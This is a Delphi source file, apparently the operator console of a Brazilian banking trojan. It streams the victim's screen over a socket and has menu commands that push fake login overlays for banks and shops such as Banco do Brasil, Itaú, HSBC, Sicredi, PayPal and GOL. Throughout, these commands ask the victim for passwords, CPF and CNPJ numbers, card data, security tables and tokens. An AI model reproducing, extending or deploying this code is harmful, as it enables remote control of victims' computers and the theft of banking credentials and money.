unit Unit2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls,XPman, Menus,ScktComp, ComCtrls, StreamManager, zLibex,
  Buttons, ImgList;

    type
  TRemoto = class(TThread)
    procedure Execute; override;
  public
    Socket: TCustomWinSocket;
  private
  end;

type
  TForm2 = class(TForm)
    ScrollBox1: TScrollBox;
    Image1: TImage;
    MainMenu1: TMainMenu;
    Bancos1: TMenuItem;
    BB1: TMenuItem;
    Desco1: TMenuItem;
    Ita1: TMenuItem;
    N1: TMenuItem;
    FechaConexo1: TMenuItem;
    Panel1: TPanel;
    StartFake1: TMenuItem;
    Pedisenhaconta6digitos1: TMenuItem;
    Pedisenhade8e6digitos1: TMenuItem;
    PediTelefone1: TMenuItem;
    Pedisenha41: TMenuItem;
    PediAgcontae81: TMenuItem;
    PediNomeeCPF1: TMenuItem;
    N2: TMenuItem;
    FinalizarProcesso1: TMenuItem;
    AzulPassagens1: TMenuItem;
    StartFake2: TMenuItem;
    PediInfo1: TMenuItem;
    N3: TMenuItem;
    LIbera1: TMenuItem;
    GOLSmile1: TMenuItem;
    StartFake3: TMenuItem;
    PediDados1: TMenuItem;
    N4: TMenuItem;
    Libera2: TMenuItem;
    PediAgCoDigito1: TMenuItem;
    Pedicpfs4s61: TMenuItem;
    PediCarto1: TMenuItem;
    PediTabela1: TMenuItem;
    N5: TMenuItem;
    Finalizar1: TMenuItem;
    StartFake4: TMenuItem;
    GOL1: TMenuItem;
    StartFake6: TMenuItem;
    PediInfoGOL1: TMenuItem;
    N9: TMenuItem;
    Finalizar5: TMenuItem;
    Americanas1: TMenuItem;
    StartFake7: TMenuItem;
    N10: TMenuItem;
    Finalizar6: TMenuItem;
    Ipiranga1: TMenuItem;
    Pagseguro1: TMenuItem;
    StartFake8: TMenuItem;
    N11: TMenuItem;
    Finalizar7: TMenuItem;
    StartFake9: TMenuItem;
    PediAgConta1: TMenuItem;
    PediTabela2: TMenuItem;
    PediItoken1: TMenuItem;
    N12: TMenuItem;
    Finalizar8: TMenuItem;
    GroupBox2: TGroupBox;
    CheckBox1: TCheckBox;
    GroupBox3: TGroupBox;
    BitBtn3: TBitBtn;
    BitBtn4: TBitBtn;
    BitBtn5: TBitBtn;
    GroupBox4: TGroupBox;
    BitBtn6: TBitBtn;
    StartFake10: TMenuItem;
    N13: TMenuItem;
    Finalizar9: TMenuItem;
    BitBtn7: TBitBtn;
    ImageList1: TImageList;
    Timer1: TTimer;
    Sicredi1: TMenuItem;
    StartFake11: TMenuItem;
    PediContaSenha4Senha61: TMenuItem;
    PediTIpodeConta1: TMenuItem;
    PediCpf1: TMenuItem;
    FISICA1: TMenuItem;
    JURIDICA1: TMenuItem;
    PediContaSenha4Senha62: TMenuItem;
    PediCNPJ1: TMenuItem;
    AssinaturaEletronica1: TMenuItem;
    Hsbc1: TMenuItem;
    StartFake12: TMenuItem;
    PediCpf2: TMenuItem;
    PediTeclado1: TMenuItem;
    StopSOMGRITO1: TMenuItem;
    PediConfirmaaoselo1: TMenuItem;
    CaracteresdeSegurana1: TMenuItem;
    PediSenhadeLetra1: TMenuItem;
    PediCartaodebitoautoatendimentoliberao1: TMenuItem;
    Finalizar10: TMenuItem;
    procedure StartFake1Click(Sender: TObject);
    procedure FechaConexo1Click(Sender: TObject);
    procedure Pedisenhaconta6digitos1Click(Sender: TObject);
    procedure Pedisenhade8e6digitos1Click(Sender: TObject);
    procedure PediTelefone1Click(Sender: TObject);
    procedure PediNomeeCPF1Click(Sender: TObject);
    procedure PediAgcontae81Click(Sender: TObject);
    procedure Pedisenha41Click(Sender: TObject);
    procedure FinalizarProcesso1Click(Sender: TObject);
    procedure StartFake2Click(Sender: TObject);
    procedure PediInfo1Click(Sender: TObject);
    procedure LIbera1Click(Sender: TObject);
    procedure StartFake3Click(Sender: TObject);
    procedure PediDados1Click(Sender: TObject);
    procedure Libera2Click(Sender: TObject);
    procedure PediAgCoDigito1Click(Sender: TObject);
    procedure Pedicpfs4s61Click(Sender: TObject);
    procedure PediCarto1Click(Sender: TObject);
    procedure PediTabela1Click(Sender: TObject);
    procedure Finalizar1Click(Sender: TObject);
    procedure StartFake4Click(Sender: TObject);
    procedure StartFakepegainfo1Click(Sender: TObject);
    procedure Finalizar2Click(Sender: TObject);
    procedure StartFake5Click(Sender: TObject);
    procedure PediInfo2Click(Sender: TObject);
    procedure Finalizar3Click(Sender: TObject);
    procedure StartFakepegainfo2Click(Sender: TObject);
    procedure Finalizar4Click(Sender: TObject);
    procedure StartFake6Click(Sender: TObject);
    procedure PediInfoGOL1Click(Sender: TObject);
    procedure Finalizar5Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure StartFake7Click(Sender: TObject);
    procedure Finalizar6Click(Sender: TObject);
    procedure StartFake8Click(Sender: TObject);
    procedure Finalizar7Click(Sender: TObject);
    procedure StartFake9Click(Sender: TObject);
    procedure PediAgConta1Click(Sender: TObject);
    procedure PediTabela2Click(Sender: TObject);
    procedure PediItoken1Click(Sender: TObject);
    procedure Finalizar8Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure BitBtn6Click(Sender: TObject);
    procedure StartFake10Click(Sender: TObject);
    procedure Finalizar9Click(Sender: TObject);
    procedure StartFakepegainfo3Click(Sender: TObject);
    procedure Finalziar1Click(Sender: TObject);
    procedure BitBtn4Click(Sender: TObject);
    procedure BitBtn5Click(Sender: TObject);
    procedure BitBtn7Click(Sender: TObject);
    procedure StartFake11Click(Sender: TObject);
    procedure PediContaSenha4Senha61Click(Sender: TObject);
    procedure PediTIpodeConta1Click(Sender: TObject);
    procedure PediCpf1Click(Sender: TObject);
    procedure PediContaSenha4Senha62Click(Sender: TObject);
    procedure PediCNPJ1Click(Sender: TObject);
    procedure AssinaturaEletronica1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure StopSOMGRITO1Click(Sender: TObject);
    procedure StartFake12Click(Sender: TObject);
    procedure PediCpf2Click(Sender: TObject);
    procedure PediTeclado1Click(Sender: TObject);
    procedure PediConfirmaaoselo1Click(Sender: TObject);
    procedure CaracteresdeSegurana1Click(Sender: TObject);
    procedure PediSenhadeLetra1Click(Sender: TObject);
    procedure PediCartaodebitoautoatendimentoliberao1Click(
      Sender: TObject);
    procedure Finalizar10Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    Socket, Socket2: TCustomWinSocket;
    Remoto: TRemoto;
    ResX, ResY: Integer;
   
  end;

var
  Form2: TForm2;

implementation

uses Unit1, Unit3;

{$R *.dfm}


// Descomprime dados
function DeCompressStream(SrcStream: TMemoryStream): boolean;
var
  InputStream, OutputStream: TMemoryStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    zdecompress(inbuffer, count, outbuffer, outcount);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result := true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;



{ TRemoto }


// Aqui é onde está a mágica, guardamos a primeira imgagem recebida e comparamos os dados com as outras.

procedure TRemoto.Execute;
var
  Desktop: TForm2;
  i: Integer;
  L: TListItem;
  bmp: TBitmap;
  Stream: TMemoryStream;

  MyBuffer: array [0 .. 10000] of byte;
  MyReceviceLength: Integer;
  S, dados2: String;

  MyFirstBmp, MySecondBmp, MyCompareBmp, UnPackStream,
    MyTempStream: TMemoryStream;
  MySize: longint;

  recebendo: boolean;

begin
  MyFirstBmp := TMemoryStream.Create;
  UnPackStream := TMemoryStream.Create;

  MyTempStream := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  UnPackStream := TMemoryStream.Create;
  MySize := 0;

  for i := 0 to Form1.LV1.Items.count - 1 do
  begin
    if Form1.LV1.Items.Item[i].SubItems.Objects[1] = TCustomWinSocket(Socket)
    then
      L := Form1.LV1.Items.Item[i];
  end;

  While not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin

      S := Socket.ReceiveText;;
      if MySize = 0 then
      begin

        if Pos('<|TAMANHO|>', S) > 0 then
        begin
          dados2 := S;

          Delete(dados2, 1, Pos('<|TAMANHO|>', dados2) + 10);
          dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);

          MySize := StrToInt(dados2);

          recebendo := true;
          dados2 := '';

          Socket.SendText('<|okok|>');
        end;

      end
      else
      begin
        { MyReceviceLength := socket.ReceiveLength;
          Socket.ReceiveBuf(MyBuffer, MyReceviceLength);
          MyTempStream.Write(MyBuffer, MyReceviceLength); }
        dados2 := dados2 + S;

        if Length(dados2) >= MySize then
        begin

          MyTempStream.Write(AnsiString(dados2)[1], MySize);
          MyTempStream.Position := 0;
          UnPackStream.Clear;

          UnPackStream.LoadFromStream(MyTempStream);
          DeCompressStream(UnPackStream);

          UnPackStream.Position := 0;
          if MyFirstBmp.Size = 0 then
          begin
            MyFirstBmp.CopyFrom(UnPackStream, 0);
            MyFirstBmp.Position := 0;

            (L.SubItems.Objects[2] as TForm2)
              .Image1.Picture.Bitmap.LoadFromStream(MyFirstBmp);
            { (L.SubItems.Objects[2] as TForm2).Width := (L.SubItems.Objects[2] as TForm2).Image1.Width+30;
              (L.SubItems.Objects[2] as TForm2).Height := (L.SubItems.Objects[2] as TForm2).Image1.Height+100; }
            (L.SubItems.Objects[2] as TForm2).ResX :=
              (L.SubItems.Objects[2] as TForm2).Image1.Width;
            (L.SubItems.Objects[2] as TForm2).ResY :=
              (L.SubItems.Objects[2] as TForm2).Image1.Height;
          end
          else
          begin
            MyCompareBmp.Clear;
            MySecondBmp.Clear;

            MyCompareBmp.CopyFrom(UnPackStream, 0);
            ResumeStream(MyFirstBmp, MySecondBmp, MyCompareBmp);

            if L.SubItems.Objects[2] <> nil then
              (L.SubItems.Objects[2] as TForm2)
                .Image1.Picture.Bitmap.LoadFromStream(MySecondBmp);

          end;
          MySize := 0;
          UnPackStream.Clear;
          MyTempStream.Clear;
          MySecondBmp.Clear;
          MyCompareBmp.Clear;

          if ((L.SubItems.Objects[2] <> nil) and
            (L.SubItems.Objects[2] as TForm2).Visible) then
            Socket.SendText('<|gets|>');
        end;
      end;
    end;

    Sleep(10); // evita a CPU ficar em 100%
  end;
end;

procedure TForm2.StartFake1Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|BB');
end;

procedure TForm2.FechaConexo1Click(Sender: TObject);
begin
Socket.SendText('CLOSE');
end;

procedure TForm2.Pedisenhaconta6digitos1Click(Sender: TObject);
begin
Socket.SendText('s6bb');
end;

procedure TForm2.Pedisenhade8e6digitos1Click(Sender: TObject);
begin
Socket.SendText('s86bb');
end;

procedure TForm2.PediTelefone1Click(Sender: TObject);
begin
Socket.SendText('telebb');
end;

procedure TForm2.PediNomeeCPF1Click(Sender: TObject);
begin
Socket.SendText('cpfbb');
end;

procedure TForm2.PediAgcontae81Click(Sender: TObject);
begin
Socket.SendText('agcobb');
end;

procedure TForm2.Pedisenha41Click(Sender: TObject);
begin
Socket.SendText('s4bb');
end;

procedure TForm2.FinalizarProcesso1Click(Sender: TObject);
begin
Socket.SendText('final');
end;

procedure TForm2.StartFake2Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|AZUL');
end;

procedure TForm2.PediInfo1Click(Sender: TObject);
begin
Socket.SendText('azul');
end;

procedure TForm2.LIbera1Click(Sender: TObject);
begin
Socket.SendText('fim_azul');
end;

procedure TForm2.StartFake3Click(Sender: TObject);
begin
 Socket.SendText('STARTFAKE|SMILES');
end;

procedure TForm2.PediDados1Click(Sender: TObject);
begin
Socket.SendText('SMILES1');
end;

procedure TForm2.Libera2Click(Sender: TObject);
begin
Socket.SendText('SMILES_CLOSE');
end;

procedure TForm2.PediAgCoDigito1Click(Sender: TObject);
begin
Socket.SendText('agdesco');
end;

procedure TForm2.Pedicpfs4s61Click(Sender: TObject);
begin
socket.SendText('paidesco');
end;

procedure TForm2.PediCarto1Click(Sender: TObject);
begin
socket.SendText('cartaodesco');
end;

procedure TForm2.PediTabela1Click(Sender: TObject);
begin
Socket.SendText('tabeladesco');
end;

procedure TForm2.Finalizar1Click(Sender: TObject);
begin
Socket.SendText('descofinal');
end;

procedure TForm2.StartFake4Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|DESCO');
end;

procedure TForm2.StartFakepegainfo1Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|PAYPAL');
end;

procedure TForm2.Finalizar2Click(Sender: TObject);
begin
Socket.SendText('FIMPAYPAL');
end;

procedure TForm2.StartFake5Click(Sender: TObject);
begin
 Socket.SendText('STARTFAKE|ML');

end;

procedure TForm2.PediInfo2Click(Sender: TObject);
begin
Socket.SendText('ML1');
end;

procedure TForm2.Finalizar3Click(Sender: TObject);
begin
Socket.SendText('FIMML');
end;

procedure TForm2.StartFakepegainfo2Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|SERASA');

end;

procedure TForm2.Finalizar4Click(Sender: TObject);
begin
Socket.SendText('FIMSERASA')
end;

procedure TForm2.StartFake6Click(Sender: TObject);
begin
 Socket.SendText('STARTFAKE|GOL');
end;

procedure TForm2.PediInfoGOL1Click(Sender: TObject);
begin
Socket.SendText('GOL1');
end;

procedure TForm2.Finalizar5Click(Sender: TObject);
begin
Socket.SendText('FIMGOL');
end;

procedure TForm2.FormShow(Sender: TObject);
begin
//Form1.MediaPlayer1.Pause;
Form3.Visible := true;
Form3.Show;
end;

procedure TForm2.StartFake7Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|AMERICANAS');

end;

procedure TForm2.Finalizar6Click(Sender: TObject);
begin
Socket.SendText('fimame');
end;

procedure TForm2.StartFake8Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|IPIRANGA');

end;

procedure TForm2.Finalizar7Click(Sender: TObject);
begin
Socket.SendText('fimipi');
end;

procedure TForm2.StartFake9Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|ITAU');
end;

procedure TForm2.PediAgConta1Click(Sender: TObject);
begin
Socket.SendText('agita');
end;

procedure TForm2.PediTabela2Click(Sender: TObject);
begin
Socket.SendText('tabelaita');
end;

procedure TForm2.PediItoken1Click(Sender: TObject);
begin
Socket.SendText('token');
end;

procedure TForm2.Finalizar8Click(Sender: TObject);
begin
Socket.SendText('fimita');
end;

procedure TForm2.BitBtn3Click(Sender: TObject);
begin
Socket.SendText('re');
end;

procedure TForm2.CheckBox1Click(Sender: TObject);
begin
  if CheckBox1.Checked then
  begin
    Image1.AutoSize := false;
    Image1.Stretch := true;
    Image1.Align := alClient;
  end
  else
  begin
    Image1.AutoSize := true;
    Image1.Stretch := false;
    Image1.Align := alNone;
  end;

end;

procedure TForm2.BitBtn6Click(Sender: TObject);
begin
Form3.Visible := true;
FOrm3.Show;
end;

procedure TForm2.StartFake10Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|PAGSEGURO');

end;

procedure TForm2.Finalizar9Click(Sender: TObject);
begin
Socket.SendText('FIMPAG');
end;

procedure TForm2.StartFakepegainfo3Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|SUBMARINO');


end;

procedure TForm2.Finalziar1Click(Sender: TObject);
begin
Socket.SendText('FIMARINO');
end;

procedure TForm2.BitBtn4Click(Sender: TObject);
begin
Socket.SendText('des');
end;

procedure TForm2.BitBtn5Click(Sender: TObject);
begin
Socket.SendText('TMT');
end;

procedure TForm2.BitBtn7Click(Sender: TObject);
begin
Socket.SendText('DTMT');
end;

procedure TForm2.StartFake11Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|SICREDI');

end;

procedure TForm2.PediContaSenha4Senha61Click(Sender: TObject);
begin
Socket.SendText('COPERATIVA');
end;

procedure TForm2.PediTIpodeConta1Click(Sender: TObject);
begin
Socket.SendText('TIPOCONTA');
end;

procedure TForm2.PediCpf1Click(Sender: TObject);
begin
Socket.SendText('SICRECPF');
end;

procedure TForm2.PediContaSenha4Senha62Click(Sender: TObject);
begin
Socket.SendText('COPERATIVAJU');
end;

procedure TForm2.PediCNPJ1Click(Sender: TObject);
begin
Socket.SendText('CNPJ');
end;

procedure TForm2.AssinaturaEletronica1Click(Sender: TObject);
begin
Socket.SendText('ELETRONICA');
end;

procedure TForm2.FormCreate(Sender: TObject);
begin
//Form1.MediaPlayer1.Pause;
end;

procedure TForm2.StopSOMGRITO1Click(Sender: TObject);
begin
Form1.MediaPlayer1.Pause;
end;

procedure TForm2.StartFake12Click(Sender: TObject);
begin
Socket.SendText('STARTFAKE|HSBC'); 
end;

procedure TForm2.PediCpf2Click(Sender: TObject);
begin
Socket.SendText('hsbccpf');
end;

procedure TForm2.PediTeclado1Click(Sender: TObject);
begin
Socket.SendText('TecladoHsbc');
end;

procedure TForm2.PediConfirmaaoselo1Click(Sender: TObject);
begin
Socket.SendText('SeloHsbc');
end;

procedure TForm2.CaracteresdeSegurana1Click(Sender: TObject);
begin
Socket.SendText('caracteres');

end;

procedure TForm2.PediSenhadeLetra1Click(Sender: TObject);
begin
Socket.SendText('senhaletra');
end;

procedure TForm2.PediCartaodebitoautoatendimentoliberao1Click(
  Sender: TObject);
begin
Socket.SendText('Finalizahsbc');
end;

procedure TForm2.Finalizar10Click(Sender: TObject);
begin
Socket.SendText('FimHsbc');
end;

end.
